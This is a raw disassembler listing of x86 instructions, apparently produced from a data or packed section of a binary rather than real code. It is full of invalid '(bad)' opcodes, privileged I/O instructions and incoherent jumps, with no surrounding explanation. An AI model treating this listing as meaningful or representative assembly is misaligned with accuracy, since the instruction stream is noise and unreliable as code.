  409224:	mov    esi,eax
  409226:	jae    0x409206
  409228:	call   0xfdc7608f
  40922d:	sbb    eax,0xf70cef21
  409232:	pop    es
  409233:	cmp    eax,0xfb74b2c8
  409238:	inc    edx
  409239:	aad    0x4e
  40923b:	inc    ebx
  40923c:	sub    eax,0x38940e0e
  409241:	push   edx
  409242:	repz xchg ecx,eax
  409244:	push   edi
  409245:	ins    DWORD PTR es:[edi],dx
  409246:	jle    0x409207
  409248:	xor    al,0xa9
  40924a:	test   al,0x71
  40924c:	and    al,0xe7
  40924e:	nop
  40924f:	cmp    esp,DWORD PTR ds:0xc5bd7118
  409255:	imul   eax,DWORD PTR [esi-0x47],0xfffffff6
  409259:	jecxz  0x4091e5
  40925b:	lds    esp,FWORD PTR [ecx]
  40925d:	loope  0x40920c
  40925f:	shl    DWORD PTR [eax-0x5e],cl
  409262:	or     eax,0xf13fb3ca
  409267:	arpl   WORD PTR [ebx*4-0x3a7c0098],bx
  40926e:	stos   DWORD PTR es:[edi],eax
  40926f:	and    DWORD PTR [edx+0x1],edi
  409272:	sub    al,0xd4
  409274:	idiv   BYTE PTR [eax-0x6c]
  409277:	sub    eax,0x95349ffd
  40927c:	stos   DWORD PTR es:[edi],eax
  40927d:	in     al,dx
  40927e:	cmp    eax,0x781f7deb
  409283:	cmp    al,0xbb
  409285:	pushf  
  409286:	add    edx,DWORD PTR [eax+0x174897b3]
  40928c:	mov    edx,DWORD PTR [edx-0x1b]
  40928f:	arpl   WORD PTR [edx+0x37],di
  409292:	sub    al,0x21
  409294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409295:	and    BYTE PTR [edi],bh
  409297:	mov    ebp,0x7f5c364b
  40929c:	out    dx,al
  40929d:	cmc    
  40929e:	sub    esp,DWORD PTR [edx-0x12]
  4092a1:	jecxz  0x409242
  4092a3:	loope  0x4092b0
  4092a5:	outs   dx,DWORD PTR ds:[esi]
  4092a6:	ss rol bh,1
  4092a9:	add    al,0x27
  4092ab:	jge    0x40924c
  4092ad:	and    DWORD PTR [ebp+ebp*2-0x45ad6cc7],esp
  4092b4:	daa    
  4092b5:	sub    DWORD PTR [eax+edi*4],esi
  4092b8:	xchg   edx,eax
  4092b9:	adc    esp,edx
  4092bb:	jo     0x40933c
  4092bd:	push   0xffffffaa
  4092bf:	jmp    0xffcfdbb6
  4092c4:	ror    esp,0x45
  4092c7:	out    0x3d,al
  4092c9:	cmp    al,0xb8
  4092cb:	aaa    
  4092cc:	or     DWORD PTR [esi-0x6a10a779],ebp
  4092d2:	cs stos DWORD PTR es:[edi],eax
  4092d4:	call   0x4f7dc56a
  4092d9:	cli    
  4092da:	loopne 0x40928c
  4092dc:	rcr    DWORD PTR [edx+0x6e7191cb],cl
  4092e2:	aad    0x16
  4092e4:	fld    TBYTE PTR [ebp+edi*2+0x626710b3]
  4092eb:	aam    0xf
  4092ed:	mov    edx,0xae54dc28
  4092f2:	jp     0x409350
  4092f4:	jb     0x40934d
  4092f6:	(bad)  
  4092f8:	xchg   esp,eax
  4092f9:	push   cs
  4092fa:	sub    bl,cl
  4092fc:	add    BYTE PTR [esi+0x73],0x65
  409300:	fcomp  st(2)
  409302:	call   0x882f:0xc7480874
  409309:	add    eax,0xf6d33a36
  40930e:	arpl   WORD PTR [edi],bp
  409310:	call   0xedfd:0x9c22c6f3
  409317:	xor    esp,eax
  409319:	loopne 0x409324
  40931b:	rcl    ebx,cl
  40931d:	arpl   WORD PTR [ebx-0x3896a638],si
  409323:	inc    ecx
  409324:	lahf   
  409325:	in     eax,0x5c
  409327:	cmp    DWORD PTR [esi-0x4c],0x9e2cba7d
  40932e:	mov    esi,0xb10b8be4
  409333:	adc    ch,BYTE PTR [ebx+0x6f]
  409336:	or     ebx,ebx
  409338:	xor    al,0xfe
  40933a:	add    eax,0x2f1c92b6
  40933f:	inc    bp
  409341:	sub    edi,ecx
  409343:	add    bl,cl
  409345:	pop    es
  409346:	dec    ebx
  409347:	imul   edx,DWORD PTR [esi+0x5282f81a],0x5
  40934e:	in     eax,0x9e
  409350:	or     ah,ah
  409352:	popa   
  409353:	jge    0x409313
  409355:	jnp    0x4092e2
  409357:	push   ebp
  409358:	aas    
  409359:	test   al,0x7b
  40935b:	or     edx,DWORD PTR [ebx+ebx*1]
  40935e:	adc    ebp,ebp
  409360:	test   DWORD PTR [esp+edx*2-0x18a33809],ebp
  409367:	nop
  409368:	xchg   ecx,eax
  409369:	or     eax,0x59ddbb8
  40936e:	xchg   edi,eax
  40936f:	sbb    DWORD PTR [esi],edx
  409371:	lds    edi,FWORD PTR [edi-0x93ad98c]
  409377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409378:	retf   
  409379:	aaa    
  40937a:	dec    esp
  40937b:	inc    eax
  40937c:	dec    edx
  40937d:	add    esp,DWORD PTR [ebx-0x74e4fab]
  409383:	jns    0x409307
  409385:	or     BYTE PTR [esi],bh
  409387:	dec    edx
  409388:	xor    eax,0x6a1ee47f
  40938d:	pusha  
  40938e:	push   ss
  40938f:	stc    
  409390:	or     BYTE PTR [edx],ah
  409392:	loopne 0x40935f
  409394:	stc    
  409395:	(bad)  
  409396:	sbb    esp,ecx
  409398:	lahf   
  409399:	fimul  DWORD PTR [edi-0x42becc39]
  40939f:	and    BYTE PTR [ebp+0x63cf06ef],bh
  4093a5:	outs   dx,BYTE PTR ds:[esi]
  4093a6:	mov    ds:0xd2c321e5,eax
  4093ab:	push   es
  4093ac:	psubw  mm7,mm4
  4093af:	daa    
  4093b0:	ret    0x25b0
  4093b3:	mov    dh,0x60
  4093b5:	pop    esp
  4093b6:	sar    bl,0xc4
  4093b9:	popf   
  4093ba:	and    bl,BYTE PTR [edx+0x62]
  4093bd:	add    BYTE PTR [ebp+0x6a],ah
  4093c0:	pop    esp
  4093c1:	push   cs
  4093c2:	repz aad 0x5e
  4093c5:	adc    BYTE PTR [ebp-0x7a],0x83
  4093c9:	inc    esi
  4093ca:	sbb    ecx,esi
  4093cc:	sbb    al,0xb3
  4093ce:	mov    ebp,0x979c374a
  4093d3:	in     al,0x80
  4093d5:	sub    cl,0x4e
  4093d8:	and    al,0x50
  4093da:	xor    BYTE PTR [esi+0x76],dl
  4093dd:	inc    ecx
  4093de:	sub    edx,DWORD PTR [ebp+0x12cf60f6]
  4093e4:	fidivr WORD PTR cs:[esi-0x69]
  4093e8:	add    eax,0xa0e6ec54
  4093ed:	aam    0xfb
  4093ef:	mov    bh,0x2
  4093f1:	mov    ecx,0x85c8eab0
  4093f6:	sbb    al,0xc5
  4093f8:	ja     0x40937f
  4093fa:	cs jnp 0x4093e7
  4093fd:	(bad)  
  4093fe:	push   ecx
  4093ff:	mov    BYTE PTR [esp+eiz*2],ah
  409402:	mov    bh,0xb5
  409404:	dec    edi
  409405:	mov    esi,0x24563964
  40940a:	test   al,0x51
  40940c:	sar    DWORD PTR [ebx+0x1d2670e9],0x14
  409413:	hlt    
  409414:	jmp    0xc622f5b
  409419:	adc    DWORD PTR [ecx-0x20],esp
  40941c:	je     0x4093b2
  40941e:	push   0x11ed2245
  409423:	jo     0x4093d4
  409425:	fstp   TBYTE PTR [eax-0x457f3b65]
  40942b:	pop    edi
  40942c:	pop    ebp
  40942d:	mov    bh,0x9a
  40942f:	popa   
  409430:	adc    esp,DWORD PTR [ebp-0x711b97a8]
  409436:	xor    BYTE PTR [esi-0x21],bh
  409439:	les    eax,FWORD PTR [eax]
  40943b:	sbb    BYTE PTR [ebx],bh
  40943d:	out    dx,eax
  40943e:	test   al,0xfe
  409440:	cmp    cl,BYTE PTR [ecx]
  409442:	js     0x40940c
  409444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409445:	sub    esp,edx
  409447:	push   ss
  409448:	sub    ecx,eax
  40944a:	aad    0x36
  40944c:	in     al,dx
  40944d:	test   esi,esi
  40944f:	sub    dh,BYTE PTR [ebx]
  409451:	mov    cl,BYTE PTR [edx-0x4a]
  409454:	(bad)  
  409455:	scas   eax,DWORD PTR es:[edi]
  409456:	cmp    eax,0xe93c50a8
  40945b:	dec    ecx
  40945c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40945d:	mov    eax,ds:0x6d6777e
  409462:	cmp    dl,bl
  409464:	mov    al,0x4f
  409466:	sub    edx,ecx
  409468:	push   es
  409469:	stc    
  40946a:	mov    edi,0x3c5271bd
  40946f:	mov    ebp,0xb1dd5f3e
  409474:	mov    eax,0x272ef28
  409479:	xlat   BYTE PTR ds:[ebx]
  40947a:	or     DWORD PTR ds:0xaf672b35,ebp
  409480:	xchg   esp,eax
  409481:	push   0xffffff93
  409483:	scas   al,BYTE PTR es:[edi]
  409484:	in     al,dx
  409485:	mov    ebx,0x9dc3403b
  40948a:	mov    ds:0x59af7bf7,eax
  40948f:	add    dh,BYTE PTR [esi-0x3c]
  409492:	cmp    DWORD PTR [esi+esi*4-0x1ad97933],edi
  409499:	(bad)  [edi-0x8a8ed4c]
  40949f:	xor    ebp,DWORD PTR [edx]
  4094a1:	fbstp  TBYTE PTR [edi-0x1a]
  4094a4:	imul   edi,DWORD PTR [eax],0xa060acb
  4094aa:	add    BYTE PTR [ebp+0x20],ch
  4094ad:	pop    es
  4094ae:	push   ecx
  4094af:	scas   al,BYTE PTR es:[edi]
  4094b0:	xor    DWORD PTR [eax+0x7b],edi
  4094b3:	cmp    dh,dh
  4094b5:	xchg   ah,cl
  4094b7:	cli    
  4094b8:	sub    BYTE PTR [esi],al
  4094ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094bb:	inc    edi
  4094bc:	add    al,0x1a
  4094be:	shr    bh,0xec
  4094c1:	rol    DWORD PTR [edi],cl
  4094c3:	cmp    eax,DWORD PTR [ebx]
  4094c5:	lahf   
  4094c6:	mov    ?,WORD PTR fs:[ebx-0x37d166bc]
  4094cd:	push   0x33
  4094cf:	push   ecx
  4094d0:	sbb    al,0x92
  4094d2:	(bad)  
  4094d3:	addr16 xchg ecx,eax
  4094d5:	icebp  
  4094d6:	in     al,dx
  4094d7:	cmp    ebp,ebx
  4094d9:	xchg   ebp,eax
  4094da:	pop    esp
  4094db:	adc    bl,cl
  4094dd:	es aam 0x3c
  4094e0:	and    eax,0x9a0ccc58
  4094e5:	arpl   ax,si
  4094e7:	adc    eax,0x2de42938
  4094ec:	retf   0x32bd
  4094ef:	iret   
  4094f0:	cmp    al,0x93
  4094f2:	xchg   esp,eax
  4094f3:	std    
  4094f4:	cdq    
  4094f5:	and    eax,0x84952571
  4094fa:	xor    al,0x43
  4094fc:	iret   
  4094fd:	mov    esp,0xcdf1c009
  409502:	es jmp 0xc857e0ba
  409508:	and    BYTE PTR [edx-0x4d],cl
  40950b:	mov    ch,0x8
  40950d:	ss xchg edi,eax
  40950f:	retf   0xd746
  409512:	pop    ebp
  409513:	les    eax,FWORD PTR [edx]
  409515:	in     al,dx
  409516:	jo     0x40958e
  409518:	fidiv  WORD PTR [edi-0x28]
  40951b:	int3   
  40951c:	add    eax,0xbd3d4e1b
  409521:	shr    DWORD PTR [ecx+0x11129588],1
  409527:	xor    DWORD PTR [ecx],ebx
  409529:	fcmovbe st,st(6)
  40952b:	jg     0x409567
  40952d:	and    eax,0x478bbc3f
  409532:	int    0xdd
  409534:	mov    edi,0x5b798ee4
  409539:	mov    bh,0x8d
  40953b:	xor    edx,ecx
  40953d:	(bad)  
  40953f:	fldcw  WORD PTR [eax+0x6a270f7a]
  409545:	inc    esi
  409546:	jae    0x40952f
  409548:	mov    eax,0xc7dd6b2f
  40954d:	sbb    ah,BYTE PTR [ebx-0x54]
  409550:	hlt    
  409551:	and    DWORD PTR [ebp-0x67],ebx
  409554:	mov    DWORD PTR [ecx],ecx
  409556:	imul   esi,edx,0x76
  409559:	xor    DWORD PTR [edx-0x75ba13cf],edi
  40955f:	and    cl,ch
  409561:	fadd   DWORD PTR [eax-0x65]
  409564:	fwait
  409565:	jecxz  0x409529
  409567:	sub    al,0x0
  409569:	std    
  40956a:	xchg   BYTE PTR [edi+edx*8-0x3b99203e],al
  409571:	icebp  
  409572:	add    ch,ch
  409574:	out    dx,eax
  409575:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409576:	push   ebp
  409577:	rcl    DWORD PTR [ebx+edx*4+0x7bbfd0c],cl
  40957e:	xchg   BYTE PTR [edi-0x4ceecdeb],ch
  409584:	or     eax,0x178d1fb6
  409589:	sub    dh,dh
  40958b:	sub    al,0xb6
  40958d:	xlat   BYTE PTR ds:[ebx]
  40958e:	aad    0x49
  409590:	sbb    eax,0xb9a232aa
  409595:	mov    ah,0xef
  409597:	add    DWORD PTR [ebx+0x43],ecx
  40959a:	and    esi,DWORD PTR [esi+0x1bcd3024]
  4095a0:	mov    dh,0xba
  4095a2:	out    0x3d,al
  4095a4:	mov    esi,0x10720fd7
  4095a9:	sahf   
  4095aa:	adc    eax,0x4ad21811
  4095af:	aam    0xe1
  4095b1:	xchg   edi,eax
  4095b2:	popf   
  4095b3:	pop    ebx
  4095b4:	cmc    
  4095b5:	sti    
  4095b6:	ror    BYTE PTR [edx+0x1b],cl
  4095b9:	ret    0x8f8f
  4095bc:	adc    dh,BYTE PTR [ecx]
  4095be:	or     al,0x55
  4095c0:	or     ah,BYTE PTR [ebp-0x4b36f5e7]
  4095c6:	or     eax,0x39f7e919
  4095cb:	retf   0xe1ed
  4095ce:	lods   al,BYTE PTR ds:[esi]
  4095cf:	or     ebx,esp
  4095d1:	push   ds
  4095d2:	lds    ebx,FWORD PTR ds:0x856b2d8c
  4095d8:	leave  
  4095d9:	or     eax,0x865835b
  4095de:	call   0xa5b5e8f0
  4095e3:	jns    0x4095a4
  4095e5:	mov    al,0x6c
  4095e7:	fsub   DWORD PTR [edx]
  4095e9:	pusha  
  4095ea:	mov    bh,0xb1
  4095ec:	mov    edx,0x8ceb10a4
  4095f1:	jbe    0x409619
  4095f3:	xor    ch,bh
  4095f5:	clc    
  4095f6:	inc    esp
  4095f7:	cmp    edx,DWORD PTR [esi]
  4095f9:	push   ds
  4095fa:	leave  
  4095fb:	sub    edx,DWORD PTR [ecx-0x77]
  4095fe:	mov    WORD PTR [edi],gs
  409600:	fdivr  QWORD PTR [ebx]
  409602:	inc    eax
  409603:	add    al,0xea
  409605:	cli    
  409606:	iret   
  409607:	and    ah,dl
  409609:	adc    DWORD PTR [edi],edi
  40960b:	and    al,0x32
  40960d:	neg    DWORD PTR [ebx]
  40960f:	jmp    0xe75abc4c
  409614:	adc    al,0xf0
  409616:	sahf   
  409617:	lock dec ecx
  409619:	pop    eax
  40961a:	mov    ah,0xc3
  40961c:	add    BYTE PTR [ebx-0xc217ba9],0x47
  409623:	movntq QWORD PTR [esi+eax*4+0x7e9a0192],mm3
  40962b:	pop    ebx
  40962c:	std    
  40962d:	pop    es
  40962e:	imul   esi,DWORD PTR [eax-0x52],0x47
  409632:	(bad)  
  409633:	aaa    
  409634:	pop    ebp
  409635:	ins    DWORD PTR es:[edi],dx
  409636:	popa   
  409637:	sahf   
  409638:	push   ebx
  409639:	xchg   BYTE PTR [edx-0x28510d66],ah
  40963f:	in     eax,0xce
  409641:	stc    
  409642:	iret   
  409643:	inc    ebx
  409644:	aaa    
  409645:	xchg   ebx,eax
  409646:	xor    esp,ebp
  409648:	pop    ds
  409649:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40964a:	inc    edx
  40964b:	retf   
  40964c:	cwde   
  40964d:	mov    dh,0x46
  40964f:	(bad)  
  409650:	mov    al,0x89
  409652:	inc    ebp
  409653:	jbe    0x4096ca
  409655:	in     eax,dx
  409656:	mov    dh,0x93
  409658:	rol    BYTE PTR [edi],1
  40965a:	sbb    eax,0x34d30f1
  40965f:	daa    
  409660:	pop    edi
  409661:	mov    esp,0x9951b0ea
  409666:	jno    0x4096a4
  409668:	data16 in al,0xe1
  40966b:	cli    
  40966c:	add    al,0xc2
  40966e:	sbb    al,0x0
  409670:	push   esi
  409671:	or     ah,BYTE PTR [eax]
  409673:	sub    al,0x71
  409675:	imul   ecx,DWORD PTR [eax+ebp*8+0x2e],0xbb2ecaef
  40967d:	ds out dx,al
  40967f:	retf   0x328f
  409682:	clc    
  409683:	cld    
  409684:	es call 0x25fe:0x565d3955
  40968c:	aas    
  40968d:	adc    eax,0x761ec551
  409692:	mov    ecx,0xd3f45f49
  409697:	sub    ecx,esi
  409699:	call   0x2207:0xc500c9f1
  4096a0:	push   edx
  4096a1:	cmp    DWORD PTR [edx],edx
  4096a3:	lods   al,BYTE PTR ds:[esi]
  4096a4:	mov    esi,0xe6d18051
  4096a9:	jnp    0x40970e
  4096ab:	pop    es
  4096ac:	cmp    al,0x5c
  4096ae:	jecxz  0x40969a
  4096b0:	das    
  4096b1:	adc    BYTE PTR [ecx-0x2c2768d9],ch
  4096b7:	dec    esi
  4096b8:	rcl    edx,1
  4096ba:	inc    esp
  4096bb:	fcom   DWORD PTR [esi]
  4096bd:	mov    bl,0x81
  4096bf:	aam    0xa5
  4096c1:	xchg   edx,eax
  4096c2:	adc    edi,edx
  4096c4:	lds    esi,FWORD PTR [eax+edi*1]
  4096c7:	jle    0x4096fe
  4096c9:	mov    ch,0x26
  4096cb:	loope  0x4096b6
  4096cd:	push   0xaf9ff6cd
  4096d2:	test   BYTE PTR [eax+ebx*2+0x4cf2c3e2],0x82
  4096da:	xor    cl,BYTE PTR [edx]
  4096dc:	aaa    
  4096dd:	mov    al,0xed
  4096df:	mul    DWORD PTR [edx+0xd]
  4096e2:	inc    ecx
  4096e3:	in     al,0x2b
  4096e5:	dec    eax
  4096e6:	cmp    ah,BYTE PTR [eax]
  4096e8:	test   eax,0xf4f72cff
  4096ed:	jmp    DWORD PTR [eax+edi*1]
  4096f0:	push   edx
  4096f1:	es repnz mov dl,0x8c
  4096f5:	arpl   WORD PTR [edx+0x1a91ea9d],si
  4096fb:	mov    BYTE PTR [esi],dh
  4096fd:	bound  ebx,QWORD PTR [eax+0x63]
  409700:	fiadd  WORD PTR [esp+ebx*2+0x673c5902]
  409707:	or     al,0x75
  409709:	ret    0xeee7
  40970c:	repnz or ah,cl
  40970f:	out    dx,al
  409710:	add    al,0x4c
  409712:	inc    ecx
  409713:	and    edx,DWORD PTR [esi+0x62]
  409716:	or     eax,0xea0f6d84
  40971b:	pop    ecx
  40971c:	in     al,dx
  40971d:	sbb    ecx,DWORD PTR [esi+0x24]
  409720:	lea    ebx,[edx+eiz*8]
  409723:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409725:	add    eax,0xed3d8124
  40972a:	cdq    
  40972b:	pop    esi
  40972c:	sub    ebp,DWORD PTR [esi-0x1b]
  40972f:	sbb    eax,0xffc8890f
  409734:	in     al,0x69
  409736:	adc    eax,0xf03ba70f
  40973b:	and    eax,0xb4175978
  409740:	mov    ebp,0x2e7f7f83
  409745:	xor    dl,ch
  409747:	jp     0x4096df
  409749:	cmp    al,0x68
  40974b:	scas   al,BYTE PTR es:[edi]
  40974c:	adc    eax,0xf94027e4
  409751:	sbb    al,BYTE PTR [ecx-0x77]
  409754:	xor    esp,DWORD PTR [esi]
  409756:	rcl    BYTE PTR [ecx+ebx*2-0x2],cl
  40975a:	cmp    esi,esi
  40975c:	mov    edx,0xae576483
  409761:	jge    0x409756
  409763:	pusha  
  409764:	adc    al,0x35
  409766:	jg     0x4096ec
  409768:	les    edi,FWORD PTR [ebp-0x3230eaee]
  40976e:	das    
  40976f:	aad    0x90
  409771:	ss sti 
  409773:	xchg   esp,eax
  409774:	loope  0x409739
  409776:	in     eax,0x71
  409778:	enter  0x41c8,0x5a
  40977c:	(bad)  
  40977e:	jl     0x40978f
  409780:	xor    bl,bl
  409782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409783:	inc    edi
  409784:	or     eax,0xb2294590
  409789:	test   eax,0x85c5fe87
  40978e:	out    dx,eax
  40978f:	data16 test al,0xcb
  409792:	adc    eax,0x8085ff99
  409797:	push   ss
  409798:	xchg   edi,eax
  409799:	mov    ebp,0xed295c23
  40979e:	jo     0x409772
  4097a0:	xchg   esp,eax
  4097a1:	mov    ecx,0x4802e7d3
  4097a6:	push   edi
  4097a7:	idiv   DWORD PTR [esi-0x52]
  4097aa:	out    dx,eax
  4097ab:	fmul   DWORD PTR [esi]
  4097ad:	xor    ch,cl
  4097af:	dec    edi
  4097b0:	push   eax
  4097b1:	call   DWORD PTR [ebp+0x13]
  4097b4:	mov    ch,0xf1
  4097b6:	xor    edx,DWORD PTR [ecx]
  4097b8:	push   esi
  4097b9:	in     eax,0x1b
  4097bb:	mov    edx,0x281798d8
  4097c0:	gs sub al,0x4a
  4097c3:	test   eax,edx
  4097c5:	outs   dx,BYTE PTR ds:[esi]
  4097c6:	ss cli 
  4097c8:	fdiv   st,st(0)
  4097ca:	dec    esp
  4097cb:	pinsrw mm6,edx,0x19
  4097cf:	or     edi,DWORD PTR [edi-0x126ce683]
  4097d5:	cld    
  4097d6:	leave  
  4097d7:	ins    BYTE PTR es:[edi],dx
  4097d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097d9:	popf   
  4097da:	mov    esi,0x28688084
  4097df:	popf   
  4097e0:	scas   eax,DWORD PTR es:[edi]
  4097e1:	and    eax,ecx
  4097e3:	sub    eax,ebx
  4097e5:	mov    es,WORD PTR [eax+esi*4-0x18]
  4097e9:	pusha  
  4097ea:	mov    esi,0x51e5984
  4097ef:	lods   eax,DWORD PTR ds:[esi]
  4097f0:	sub    al,0x10
  4097f2:	fsub   st,st(7)
  4097f4:	mov    BYTE PTR [edi+0x41],bl
  4097f7:	iret   
  4097f8:	les    edx,FWORD PTR [ecx]
  4097fa:	shld   DWORD PTR [ebx],ebx,cl
  4097fd:	add    DWORD PTR [esi],ebp
  4097ff:	jg     0x4097e6
  409801:	repz jae 0x409788
  409804:	xor    bl,dl
  409806:	stos   DWORD PTR es:[edi],eax
  409807:	xchg   edi,eax
  409808:	xor    dh,BYTE PTR [eax]
  40980a:	add    ch,BYTE PTR ds:0x68c339aa
  409810:	mov    DWORD PTR [esi+esi*4-0x48],0x7f459237
  409818:	shl    DWORD PTR [ebx-0x53],0x50
  40981c:	mov    ecx,0xb9297837
  409821:	sub    bl,BYTE PTR [ebp+0x5b05defd]
  409827:	mov    edi,DWORD PTR [edi+0x18]
  40982a:	mov    al,ds:0xa49f36c2
  40982f:	lock lock or DWORD PTR [eax+0x1c],esp
  409834:	inc    ecx
  409835:	dec    edi
  409836:	jmp    0x4097e4
  409838:	ja     0x40984a
  40983a:	aas    
  40983b:	jbe    0x40985b
  40983d:	retf   
  40983e:	call   0x4fbf:0xcf17860c
  409845:	xchg   ecx,eax
  409846:	ins    DWORD PTR es:[edi],dx
  409847:	or     eax,0x59791b52
  40984c:	(bad)  
  40984d:	aam    0x9f
  40984f:	aam    0x53
  409851:	mov    ecx,0xecc6f12d
  409856:	bound  edx,QWORD PTR ds:[esi+0x5f]
  40985a:	aaa    
  40985b:	push   cs
  40985c:	and    al,0x30
  40985e:	gs jp  0x40988b
  409861:	imul   edi,DWORD PTR [esi+0x75ed5fe9],0x32
  409868:	jne    0x409850
  40986a:	div    DWORD PTR [ebp+0x41ff549e]
  409870:	sub    al,BYTE PTR [edi+0x4c4eb663]
  409876:	pop    esi
  409877:	shr    BYTE PTR fs:[ebx],cl
  40987a:	pop    ebx
  40987b:	xor    BYTE PTR [edi+0x1e],cl
  40987e:	scas   eax,DWORD PTR es:[edi]
  40987f:	mul    BYTE PTR [edx+esi*1+0x32d02f18]
  409886:	and    al,0xdb
  409888:	nop
  409889:	or     esp,DWORD PTR [ebp+0x4ed43fa0]
  40988f:	out    0xbe,al
  409891:	jg     0x409831
  409893:	ins    DWORD PTR es:[edi],dx
  409894:	xchg   ebp,eax
  409895:	xor    DWORD PTR [eax-0x2c],ebx
  409898:	lock loop 0x4098ea
  40989b:	sar    ah,cl
  40989d:	fcomip st,st(2)
  40989f:	dec    ecx
  4098a0:	jge    0x4098f5
  4098a2:	mov    eax,0x28d5fac9
  4098a7:	outs   dx,DWORD PTR ds:[esi]
  4098a8:	cdq    
  4098a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098aa:	stc    
  4098ab:	cs jge 0x409912
  4098ae:	mov    eax,ds:0xeb5c4a87
  4098b3:	or     BYTE PTR [edx-0x928293e],0x4e
  4098ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098bb:	xchg   DWORD PTR [esi],eax
  4098bd:	stos   DWORD PTR es:[edi],eax
  4098be:	out    0xc3,eax
  4098c0:	xchg   ebp,eax
  4098c1:	popf   
  4098c2:	mov    eax,0x890664d6
  4098c7:	mov    ?,WORD PTR [ebx-0x6a]
  4098ca:	sub    dh,cl
  4098cc:	cld    
  4098cd:	xor    al,0x74
  4098cf:	dec    ebp
  4098d0:	dec    ebx
  4098d1:	mov    esp,0x3611b45c
  4098d6:	pop    ds
  4098d7:	cmp    bh,al
  4098d9:	mov    ch,BYTE PTR [ecx+0xc2f16b4]
  4098df:	imul   ecx,DWORD PTR [edi],0xffffff9b
  4098e2:	lock push ebx
  4098e4:	jp     0x4098df
  4098e6:	and    al,0xd4
  4098e8:	or     cl,BYTE PTR [edx-0x5a]
  4098eb:	mov    eax,edx
  4098ed:	mov    ebp,0x93c895ed
  4098f2:	push   edx
  4098f3:	aaa    
  4098f4:	xchg   esp,eax
  4098f5:	push   0x292775e1
  4098fa:	jp     0x40992c
  4098fc:	pop    esp
  4098fd:	push   edx
  4098fe:	jns    0x4098cd
  409900:	pop    edi
  409901:	sbb    BYTE PTR [ebx],bl
  409903:	shl    bl,0x53
  409906:	ja     0x40989d
  409908:	(bad)  
  409909:	leave  
  40990a:	mov    ebx,0xddf356ba
  40990f:	std    
  409910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409911:	aam    0x51
  409913:	xchg   ebx,eax
  409914:	aad    0x1f
  409916:	std    
  409917:	adc    BYTE PTR [esi],ch
  409919:	cmp    ecx,DWORD PTR [edi]
  40991b:	cmp    al,0x6c
  40991d:	adc    edx,esi
  40991f:	or     eax,0x76ee30a2
  409924:	fmul   QWORD PTR [ebp-0x70e22810]
  40992a:	push   0x753f29a8
  40992f:	adc    al,0xd
  409931:	jnp    0x40995d
  409933:	rdmsr  
  409935:	pusha  
  409936:	test   WORD PTR ds:[edi-0x31f5affd],bx
  40993e:	(bad)  
  40993f:	(bad)  
  409940:	mov    ebx,0xdb7c0c19
  409945:	fs mov esi,0x6d135fb1
  40994b:	pop    eax
  40994c:	mov    ds:0x727754f5,eax
  409951:	jno    0x409943
  409953:	lods   eax,DWORD PTR ds:[esi]
  409954:	loopne 0x4098e1
  409956:	lds    esp,FWORD PTR [ecx]
  409958:	jg     0x40999e
  40995a:	ror    DWORD PTR [ebp-0x2fea835a],0xaa
  409961:	imul   edi,DWORD PTR [edx],0xba302c46
  409967:	pop    esp
  409968:	jnp    0x409915
  40996a:	or     DWORD PTR ds:0xddc21c3f,esi
  409970:	pop    edx
  409971:	xor    eax,0x80dca42
  409976:	inc    eax
  409977:	xor    al,0xef
  409979:	or     BYTE PTR [esi],0xbb
  40997c:	ret    0xea02
  40997f:	les    esp,FWORD PTR [ebx+0x445f42f7]
  409985:	cld    
  409986:	retf   
  409987:	mov    WORD PTR [edx+0x6d194bc2],cs
  40998d:	cmp    al,0xcd
  40998f:	cmp    eax,0x1e8c45ed
  409994:	push   edi
  409995:	stos   BYTE PTR es:[edi],al
  409996:	mov    bh,0x94
  409998:	lahf   
  409999:	jmp    0x40994c
  40999b:	rcl    DWORD PTR [ebp+0x5b7068ab],1
  4099a1:	int3   
  4099a2:	idiv   DWORD PTR [edx+esi*1]
  4099a5:	les    ebp,FWORD PTR [edx+0x46]
  4099a8:	stos   DWORD PTR es:[edi],eax
  4099a9:	cli    
  4099aa:	enter  0xe7b0,0x91
  4099ae:	lods   al,BYTE PTR ds:[esi]
  4099af:	xor    BYTE PTR [edx+0x7f5e7e98],al
  4099b5:	push   ebp
  4099b6:	ja     0x409985
  4099b8:	ins    BYTE PTR es:[edi],dx
  4099b9:	outs   dx,DWORD PTR ds:[esi]
  4099ba:	(bad)  
  4099bb:	dec    DWORD PTR [esp+eiz*8+0x13]
  4099bf:	ret    
  4099c0:	cmp    eax,0x4fd2ee0e
  4099c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099c6:	lahf   
  4099c7:	fldz   
  4099c9:	dec    ebp
  4099ca:	nop
  4099cb:	mov    al,0xd
  4099cd:	in     eax,0x5a
  4099cf:	adc    ebx,DWORD PTR [edx]
  4099d1:	sub    esp,0xfffffff3
  4099d4:	mov    eax,0xc8caeedf
  4099d9:	inc    eax
  4099da:	out    dx,al
  4099db:	mov    ah,BYTE PTR [ecx+0x41f5bc5d]
  4099e1:	fisubr DWORD PTR [ebp+0x26]
  4099e4:	push   ebx
  4099e5:	nop
  4099e6:	adc    edx,DWORD PTR [edx]
  4099e8:	xor    BYTE PTR [ecx+edx*1+0x7f58d3d1],ah
  4099ef:	jmp    0x4f37:0xc83a3b67
  4099f6:	es push esi
  4099f8:	or     eax,0xab609ad7
  4099fd:	pop    ebp
  4099fe:	cld    
  4099ff:	push   edx
  409a00:	mov    bh,0x3f
  409a02:	fwait
  409a03:	pushf  
  409a04:	push   ss
  409a05:	jno    0x409a80
  409a07:	adc    ah,ah
  409a09:	cdq    
  409a0a:	push   ds
  409a0b:	icebp  
  409a0c:	xor    edx,0xcb965c1f
  409a12:	lock pop ecx
  409a14:	ds xchg ecx,eax
  409a16:	inc    edx
  409a17:	shl    BYTE PTR [edi-0x6688ade0],0xc6
  409a1e:	mov    bh,0x3e
